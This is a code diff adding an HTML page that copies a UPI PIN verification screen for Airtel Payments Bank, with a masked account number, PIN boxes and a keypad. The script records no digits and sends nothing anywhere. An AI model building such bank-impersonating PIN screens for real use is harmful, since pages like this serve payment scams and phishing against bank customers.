@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link
+      rel="stylesheet"
+      data-purpose="Layout StyleSheet"
+      title="Web Awesome"
+      href="/css/app-wa-09b459cf485d4b1f3304947240314c05.css?vsn=d"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://site-assets.fontawesome.com/releases/v6.6.0/css/all.css"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-duotone-solid.css"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-thin.css"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-solid.css"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-regular.css"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-light.css"
+    />
+    <title>UPI PIN Verification</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #fff;
+        height: 100vh;
+      }
+      .cont {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        /* max-width: 600px; */
+        margin: 0 auto;
+      }
+      span.fre {
+        padding: 5px;
+    font-size: 4.5vw;
+    background: #f1f1f1;
+    display: block;
+    font-family: sans-serif;
+    box-shadow: rgb(151 151 151 / 25%) 0px 2px 0px 0px;
+    margin-top: 4px;
+    text-align: left;
+    padding-left: 4vw;
+    font-weight: 550;
+      }
+      .bank-name {
+    margin-left: 4vw;
+}
+      p.re {
+        font-family: sans-serif;
+    font-size: 4.5vw;
+    margin-bottom: 0;
+    font-weight: 700;
+      }
+      .header {
+        width: 100%;
+    padding: 1vh 11vw 0 0vw;
+    box-sizing: border-box;
+    text-align: center;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    color: #372c2c;
+      }
+      .header .bank-name {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        font-size: 3vw; /* Responsive font size */
+        font-weight: bold;
+        margin-bottom: 5px;
+      }
+      .warningicon i {
+        color: #ffb300;
+        font-size: 6.6vw;
+      }
+      .header .upi-logo {
+        width: 20vw;
+        height: auto;
+      }
+      .container {
+        text-align: center;
+        /* margin-top: 20px;
+        padding: 0 15px; */
+      }
+      .container h2 {
+        font-size: 5vw; /* Responsive heading */
+        margin-bottom: 10px;
+      }
+      .pin-box {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 12vw;
+
+      }
+      .pin-box input {
+        width: 10vw;
+        height: 10vw;
+        margin: 0 5px;
+        border: none;
+        border-bottom: 2px solid #00000040;
+        text-align: center;
+        font-size: 6vw;
+        background-color: transparent;
+      }
+      .pin-box input:focus {
+        outline: none;
+      }
+      .warning {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: #ffeca7c2;
+        color: #000000;
+        padding: 5px;
+        border-radius: 20px;
+        font-size: 3.6vw;
+        margin: 20vw auto;
+        width: 80%;
+        font-weight: 700;
+        font-family: sans-serif;
+      }
+      .warning-icon {
+        font-size: 6vw;
+        margin-right: 10px;
+      }
+      @media (max-width: 480px) {
+        .container h2 {
+          font-size: 6vw; /* Smaller text for mobile */
+        }
+        .header .bank-name {
+          font-size: 3vw;
+        }
+        .pin-box input {
+          width: 12vw;
+          height: 12vw;
+          font-size: 8vw;
+        }
+      }
+
+      @media (max-width: 768px) {
+        .container h2 {
+          font-size: 5vw; /* Larger text for tablets */
+        }
+        .header .bank-name {
+          font-size: 4vw;
+        }
+      }
+
+
+
+
+
+      .keypad {
+        position: relative;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    width: 100vw; /* Adjust width as needed */
+    /* max-width: 400px; Limit maximum width */
+    background-color: #fff;
+    /* padding: 4vw; */
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+}
+
+.keypad button {
+    width: 100%;
+    min-height: 10vw; /* Adjust height relative to viewport width */
+    font-size: 5vw; /* Adjust font size relative to viewport width */
+    background-color: #f1f1f1;
+    border: none;
+    color: #1a3381;
+    cursor: pointer;
+    transition: background-color 0.3s, transform 0.1s;
+}
+
+.keypad button:active {
+    background-color: #ccc;
+    transform: scale(0.95);
+}
+
+.keypad .zero {
+    grid-column: span 2; /* Span two columns */
+}
+
+.keypad .delete, .keypad .enter {
+    color: #1d3b73;
+}
+
+.keypad .delete:hover, .keypad .enter:hover {
+    background-color: #0a2a52;
+}
+button.enter {
+    font-size: 13vw !important;
+}
+/* Media Queries for responsiveness */
+@media (max-width: 350px) {
+    .keypad {
+        position: absolute;
+        bottom: 0;
+    }
+}
+@media (max-width: 600px) {
+    .keypad {
+        grid-gap: 0; /* Reduced gap on smaller screens */
+        width: 100vw; /* Increase width slightly on smaller screens */
+        /* position: relative; */
+    }
+
+    .keypad button {
+        height: 16vw; /* Adjust height for smaller screens */
+        font-size: 7vw; /* Adjust font size for smaller screens */
+    }
+}
+    </style>
+  </head>
+  <body>
+    <div class="cont">
+      <div class="header">
+        <div class="bank-name">Airtel Payments Bank <span>XXXX9544</span></div>
+        <img
+          class="upi-logo"
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/UPI-Logo-vector.svg/640px-UPI-Logo-vector.svg.png"
+          alt="UPI Logo"
+        />
+      </div>
+
+      <div class="container">
+        <span class="fre">Verify UPI PIN</span>
+        <p class="re">ENTER 4-DIGIT UPI PIN</p>
+        <div class="pin-box">
+          <input type="password" maxlength="1" id="pin1" readonly />
+          <input type="password" maxlength="1" id="pin2" readonly />
+          <input type="password" maxlength="1" id="pin3" readonly />
+          <input type="password" maxlength="1" id="pin4" readonly />
+        </div>
+
+        <div class="warning">
+          <div class="warningicon">
+            <i class="fa-solid fa-circle-exclamation"></i>
+          </div>
+          <p class="fds">
+            UPI PIN will keep your account secure from unauthorized access. Do
+            not share this PIN with anyone.
+          </p>
+        </div>
+      </div>
+      <div class="keypad">
+        <button onclick="enterDigit('1')">1</button>
+        <button onclick="enterDigit('2')">2</button>
+        <button onclick="enterDigit('3')">3</button>
+        <button onclick="enterDigit('4')">4</button>
+        <button onclick="enterDigit('5')">5</button>
+        <button onclick="enterDigit('6')">6</button>
+        <button onclick="enterDigit('7')">7</button>
+        <button onclick="enterDigit('8')">8</button>
+        <button onclick="enterDigit('9')">9</button>
+        <button class="delete" onclick="deleteDigit()"><i class="fa-solid fa-delete-left"></i></button>
+        <button onclick="enterDigit('0')">0</button>
+        <button class="enter"><i class="fa-solid fa-circle-check"></i></button>
+      </div>
+  </div>
+<script>
+  let currentPinIndex = 0;
+
+  function enterDigit(digit) {
+    if (currentPinIndex <4) {
+      const pinInput = document.getElementById(
+        "pin" + (currentPinIndex +1)
+    );
+    pinInput.value = "."
+    pinInput.style.borderBotom ="2px solid #000000";
+    currentPinIndex++;
+    
+    }
+  }
+
+  function deleteDigit() {
+    if(currentPinIndex > 0) {
+      document.getElementById("pin" + currentPinIndex).value ="",
+      currentPinIndex--;
+    
+    }
+  }
+  function deleteDigit(digit){
+    if(currentPinIndex > 0) {
+      const pinInput = document.getElementById("pin" + currentPinIndex);
+      pinInput.value = "";
+      pinInput.style.borderBottom ="2px solid #00000040";
+      currentPinIndex--;
+    }
+  }
+</script>
+</body>
+</html>
